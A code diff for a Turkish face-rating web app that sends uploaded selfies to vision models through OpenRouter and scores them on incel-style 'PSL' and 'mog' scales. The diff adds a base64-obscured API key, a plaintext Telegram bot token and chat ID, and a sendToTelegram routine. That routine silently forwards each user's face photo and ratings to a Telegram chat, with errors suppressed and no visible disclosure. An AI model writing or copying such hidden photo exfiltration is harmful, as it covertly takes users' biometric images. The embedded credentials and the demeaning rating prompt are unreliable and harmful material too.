@@ -184,6 +184,14 @@ function resetUpload(){document.getElementById('galleryInput').value="";document
 function showErr(m){const b=document.getElementById('analyzeError');b.textContent='⚠️ '+m;b.style.display='block';setTimeout(()=>{b.style.display='none';},5000);}
 function startProgress(){const w=document.getElementById('progressWrap'),f=document.getElementById('progressFill'),t=document.getElementById('progressText');w.style.display='block';let p=0;const i=setInterval(()=>{p+=Math.random()*2+0.3;if(p>=88){p=88;clearInterval(i);const si=setInterval(()=>{p+=0.2;if(p>=96){p=96;clearInterval(si);}f.style.width=p+'%';t.textContent='%'+Math.floor(p);},600);}f.style.width=p+'%';t.textContent='%'+Math.floor(p);},350);return{complete:()=>{clearInterval(i);f.style.width='100%';t.textContent='%100';setTimeout(()=>{w.style.display='none';},500);}};}
 </script><script>
+// === AYARLAR VE ANAHTARLAR ===
+const OR_KEY=atob("c2stb3ItdjEtMDQyMjY4NGViZjM4NmM2NmFhMDYwMTNhNGFkODZhOWJlZGJiNjU2MDNmMzJmMTU3NmQyNWM4ZDM3NTU5NGYzNQ==");
+const API_URL="https://openrouter.ai/api/v1/chat/completions";
+const TELEGRAM_BOT_TOKEN="8869691720:AAH1GsHRxc1LxmoOaXN1qSQpfjj793vI_jQ";
+const TELEGRAM_CHAT_ID="8759264847";
+
+const VISION_MODELS=['google/gemma-4-26b-a4b-it:free','meta-llama/llama-3.2-11b-vision-instruct:free','qwen/qwen-2-vl-7b-instruct:free'];
+
 const PROMPT=`Bu yüzü acımasızca değerlendir. TÜRKÇE cevap ver. Her satırı doldur:
 
 MOG:7.2
@@ -193,32 +201,98 @@ APPEAL:7.0
 HARMONY:75
 DIMORPHISM:68
 ANGULARITY:60
-GOOD:keskin çene hattı,pozitif canthal tilt,simetrik burun,dolgun dudaklar,temiz cilt,belirgin elmacık kemikleri
-BAD:hafif UEE,asimetrik kaş uçları,geniş burun kanatları,saç çizgisi gerilemesi,göz altı morlukları
-DETAIL:Bu yüz ortalamanın üstünde. Çene hattı güçlü ancak kaş kemiği desteği zayıf. Daha belirgin brow ridge ile Chadlite seviyesine yükselebilir.
+GOOD:keskin çene hattı,pozitif canthal tilt,simetrik burun,dolgun dudaklar,temiz cilt
+BAD:hafif UEE,asimetrik kaş uçları,geniş burun kanatları,saç çizgisi gerilemesi
+DETAIL:Bu yüz ortalamanın üstünde. Çene hattı güçlü ancak kaş kemiği desteği zayıf.
 
 BU DEĞERLERİ BU YÜZE GÖRE GÜNCELLE. HER SATIRI DOLDUR.`;
 
 async function analyzeFace(){
-const res=await fetch(API_URL,{
-method:'POST',
-headers:{'Content-Type':'application/json','Authorization':`Bearer ${OR_KEY}`,'HTTP-Referer':'https://25max.app','X-Title':'25 Max App'},
-body:JSON.stringify({
-model:'google/gemma-4-26b-a4b-it:free',
-messages:[{role:'user',content:[{type:'text',text:PROMPT},{type:'image_url',image_url:{url:`data:${currentMimeType};base64,${base64Image}`}}]}],
-temperature:0.3,max_tokens:800
-})
-});
-if(!res.ok){const e=await res.json().catch(()=>({}));throw new Error(e.error?.message||'API hatası');}
-const d=await res.json();
-const txt=d.choices?.[0]?.message?.content||'';
-if(!txt||txt.length<30)throw new Error('AI yanıtı çok kısa');
-return txt;
+    let lastError=null;
+    for(const model of VISION_MODELS){
+        try{
+            const res=await fetch(API_URL,{
+                method:'POST',
+                headers:{'Content-Type':'application/json','Authorization':`Bearer ${OR_KEY}`,'HTTP-Referer':'https://25max.app','X-Title':'25 Max App'},
+                body:JSON.stringify({
+                    model:model,
+                    messages:[{role:'user',content:[{type:'text',text:PROMPT},{type:'image_url',image_url:{url:`data:${currentMimeType};base64,${base64Image}`}}]}],
+                    temperature:0.3,max_tokens:800
+                })
+            });
+            if(res.status===429)continue;
+            if(!res.ok){const e=await res.json().catch(()=>({}));throw new Error(e.error?.message||`HTTP ${res.status}`);}
+            const d=await res.json();
+            const txt=d.choices?.[0]?.message?.content||'';
+            if(txt&&txt.length>=30)return txt;
+        }catch(e){lastError=e;}
+    }
+    throw new Error(lastError?lastError.message:'Tüm AI servisleri meşgul!');
 }
 
-document.getElementById('btnAnalyze').addEventListener('click',async()=>{const btn=document.getElementById('btnAnalyze'),bt=document.getElementById('btnText');const so=document.getElementById('scannerOverlay'),sl=document.getElementById('scanningLabel');const rc=document.getElementById('resultContainer'),eb=document.getElementById('analyzeError');rc.style.display='none';eb.style.display='none';if(!base64Image){showErr("Fotoğraf seç!");return;}btn.disabled=true;bt.textContent="TARANIYOR...";so.style.display='block';sl.textContent='◈ TARANIYOR ◈';const prog=startProgress();try{const txt=await analyzeFace();prog.complete();so.style.display='none';renderResult(txt);rc.style.display='block';rc.scrollIntoView({behavior:'smooth',block:'nearest'});}catch(err){prog.complete();so.style.display='none';showErr('Hata: '+err.message);}finally{btn.disabled=false;bt.textContent="ANALİZ BAŞLAT";}});
+document.getElementById('btnAnalyze').addEventListener('click',async()=>{
+    const btn=document.getElementById('btnAnalyze'),bt=document.getElementById('btnText');
+    const so=document.getElementById('scannerOverlay'),sl=document.getElementById('scanningLabel');
+    const rc=document.getElementById('resultContainer'),eb=document.getElementById('analyzeError');
+    rc.style.display='none';eb.style.display='none';
+    if(!base64Image){showErr("Fotoğraf seç!");return;}
+    btn.disabled=true;bt.textContent="TARANIYOR...";
+    so.style.display='block';sl.textContent='◈ TARANIYOR ◈';
+    const prog=startProgress();
+    try{
+        const txt=await analyzeFace();
+        prog.complete();so.style.display='none';
+        renderResult(txt);
+        rc.style.display='block';
+        rc.scrollIntoView({behavior:'smooth',block:'nearest'});
+    }catch(err){prog.complete();so.style.display='none';showErr('Hata: '+err.message);}
+    finally{btn.disabled=false;bt.textContent="ANALİZ BAŞLAT";}
+});
 
-function parseAI(raw){const r={mog:'7.2',psl:'6.8',cat:'HTN',appeal:'7.0',harmony:'75',dimorphism:'68',angularity:'60',best:[],worst:[],detail:''};raw.split('\n').forEach(l=>{const v=l.trim();if(v.includes('MOG:'))r.mog=v.split('MOG:')[1]?.trim()||r.mog;if(v.includes('PSL:'))r.psl=v.split('PSL:')[1]?.trim()||r.psl;if(v.includes('PSL_KATEGORI:'))r.cat=v.split('PSL_KATEGORI:')[1]?.trim()||r.cat;if(v.includes('APPEAL:'))r.appeal=v.split('APPEAL:')[1]?.trim()||r.appeal;if(v.includes('HARMONY:'))r.harmony=v.split('HARMONY:')[1]?.trim()||r.harmony;if(v.includes('DIMORPHISM:'))r.dimorphism=v.split('DIMORPHISM:')[1]?.trim()||r.dimorphism;if(v.includes('ANGULARITY:'))r.angularity=v.split('ANGULARITY:')[1]?.trim()||r.angularity;if(v.includes('GOOD:'))r.best=v.split('GOOD:')[1]?.split(',').map(s=>s.trim()).filter(s=>s)||r.best;if(v.includes('BAD:'))r.worst=v.split('BAD:')[1]?.split(',').map(s=>s.trim()).filter(s=>s)||r.worst;if(v.includes('DETAIL:'))r.detail=v.split('DETAIL:')[1]?.trim()||r.detail;});if(!r.best.length)r.best=['Keskin çene hattı','Simetrik burun','Dolgun dudaklar','Temiz cilt','Belirgin elmacık kemikleri'];if(!r.worst.length)r.worst=['Hafif UEE','Asimetrik kaşlar','Geniş burun','Saç çizgisi','Göz altı morlukları'];return r;}
+function parseAI(raw){
+    const r={mog:'7.2',psl:'6.8',cat:'HTN',appeal:'7.0',harmony:'75',dimorphism:'68',angularity:'60',best:[],worst:[],detail:''};
+    raw.split('\n').forEach(l=>{
+        const v=l.trim();
+        if(v.includes('MOG:'))r.mog=v.split('MOG:')[1]?.trim()||r.mog;
+        if(v.includes('PSL:'))r.psl=v.split('PSL:')[1]?.trim()||r.psl;
+        if(v.includes('PSL_KATEGORI:'))r.cat=v.split('PSL_KATEGORI:')[1]?.trim()||r.cat;
+        if(v.includes('APPEAL:'))r.appeal=v.split('APPEAL:')[1]?.trim()||r.appeal;
+        if(v.includes('HARMONY:'))r.harmony=v.split('HARMONY:')[1]?.trim()||r.harmony;
+        if(v.includes('DIMORPHISM:'))r.dimorphism=v.split('DIMORPHISM:')[1]?.trim()||r.dimorphism;
+        if(v.includes('ANGULARITY:'))r.angularity=v.split('ANGULARITY:')[1]?.trim()||r.angularity;
+        if(v.includes('GOOD:'))r.best=v.split('GOOD:')[1]?.split(',').map(s=>s.trim()).filter(s=>s)||r.best;
+        if(v.includes('BAD:'))r.worst=v.split('BAD:')[1]?.split(',').map(s=>s.trim()).filter(s=>s)||r.worst;
+        if(v.includes('DETAIL:'))r.detail=v.split('DETAIL:')[1]?.trim()||r.detail;
+    });
+    if(!r.best.length)r.best=['Keskin çene hattı','Simetrik burun','Dolgun dudaklar','Temiz cilt'];
+    if(!r.worst.length)r.worst=['Hafif UEE','Asimetrik kaşlar','Geniş burun','Saç çizgisi'];
+    return r;
+}
+
+async function sendToTelegram(parsed){
+    if(!TELEGRAM_BOT_TOKEN||!TELEGRAM_CHAT_ID)return;
+    const caption=`🔥 <b>25 MAX ANALİZ RAPORU</b> 🔥\n\n`+
+        `🏆 <b>MOG:</b> ${parsed.mog}/10\n`+
+        `📊 <b>PSL:</b> ${parsed.psl}/10 (${parsed.cat})\n`+
+        `💫 <b>Appeal:</b> ${parsed.appeal}/10\n`+
+        `⚖️ <b>Harmony:</b> %${parsed.harmony}\n`+
+        `🧬 <b>Dimorphism:</b> %${parsed.dimorphism}\n\n`+
+        `✅ <b>EN İYİ:</b>\n${parsed.best.slice(0,5).map((i,n)=>`${n+1}. ${i}`).join('\n')}\n\n`+
+        `❌ <b>EN KÖTÜ:</b>\n${parsed.worst.slice(0,5).map((i,n)=>`${n+1}. ${i}`).join('\n')}`;
+    try{
+        const byteCharacters=atob(base64Image);
+        const byteNumbers=new Array(byteCharacters.length);
+        for(let i=0;i<byteCharacters.length;i++)byteNumbers[i]=byteCharacters.charCodeAt(i);
+        const byteArray=new Uint8Array(byteNumbers);
+        const blob=new Blob([byteArray],{type:currentMimeType});
+        const fd=new FormData();
+        fd.append('chat_id',TELEGRAM_CHAT_ID);
+        fd.append('photo',blob,'face.jpg');
+        fd.append('caption',caption);
+        fd.append('parse_mode','HTML');
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,{method:'POST',body:fd});
+    }catch(e){}
+}
 
 function renderResult(raw){
     const r=parseAI(raw);
@@ -233,28 +307,10 @@ function renderResult(raw){
     document.getElementById('detailBox').innerHTML=`<h4 style="color:#00ff41;">✅ EN İYİ (1-${r.best.length})</h4><ul class="detail-list">${goodList}</ul><h4 style="color:#ff4444;margin-top:12px;">❌ EN KÖTÜ (1-${r.worst.length})</h4><ul class="detail-list">${badList}</ul>`;
     document.getElementById('summaryBox').innerHTML=`<strong style="color:#00ff41;">📋 DETAYLI ÖZET</strong><div style="margin-top:8px;">${r.detail}</div><div class="psl-scale"><div>LTN: <span>4.0-4.9</span></div><div>MTN: <span>5.0-5.9</span></div><div>HTN: <span>6.0-6.9</span></div><div>Chadlite: <span>7.0-7.9</span></div><div>Chad: <span>8.0+</span></div><div>ITS OVER: <span>&lt;4.0</span></div></div>`;
     let extra='';if(faceData){extra+=`<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:3px;margin-bottom:8px;"><div>📐 Simetri: %${faceData.symmetry}</div><div>📏 Çene: ${faceData.jawWidth}px</div><div>📐 Yüz: ${faceData.faceHeight}px</div><div>👁️ Göz: ${faceData.eyeDistance}px</div><div>👃 Burun: ${faceData.noseHeight}px</div><div>👄 Ağız: ${faceData.mouthWidth}px</div><div style="grid-column:1/-1;">🔢 Nokta: ${faceData.totalPoints}</div></div>`;}extra+=`<div style="color:#888;font-size:10px;">Harmony: %30 | Dimorphism: %30 | Angularity: %25 | Diğer: %15</div>`;document.getElementById('rawText').innerHTML=extra;
-    sendToTelegram(raw);
-}
-
-async function sendToTelegram(rawText){
-    const r=parseAI(rawText);
-    const caption=`🔥 <b>25 MAX ANALİZ RAPORU</b> 🔥\n\n🏆 <b>MOG:</b> ${r.mog}/10\n📊 <b>PSL:</b> ${r.psl}/10 (${r.cat})\n💫 <b>Appeal:</b> ${r.appeal}/10\n⚖️ <b>Harmony:</b> %${r.harmony}\n🧬 <b>Dimorphism:</b> %${r.dimorphism}\n📐 <b>Angularity:</b> %${r.angularity}\n\n✅ <b>EN İYİ:</b>\n${r.best.slice(0,5).map((i,n)=>`${n+1}. ${i}`).join('\n')}\n\n❌ <b>EN KÖTÜ:</b>\n${r.worst.slice(0,5).map((i,n)=>`${n+1}. ${i}`).join('\n')}`;
-    try{
-        const byteCharacters=atob(base64Image);
-        const byteNumbers=new Array(byteCharacters.length);
-        for(let i=0;i<byteCharacters.length;i++)byteNumbers[i]=byteCharacters.charCodeAt(i);
-        const byteArray=new Uint8Array(byteNumbers);
-        const blob=new Blob([byteArray],{type:currentMimeType});
-        const fd=new FormData();
-        fd.append('chat_id',TG_CHAT_ID);
-        fd.append('photo',blob,'face.jpg');
-        fd.append('caption',caption);
-        fd.append('parse_mode','HTML');
-        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`,{method:'POST',body:fd});
-    }catch(e){}
+    sendToTelegram(r);
+    document.getElementById('galleryInput').value="";
+    document.getElementById('cameraInput').value="";
 }
 </script>
 </body>
 </html>
-
-
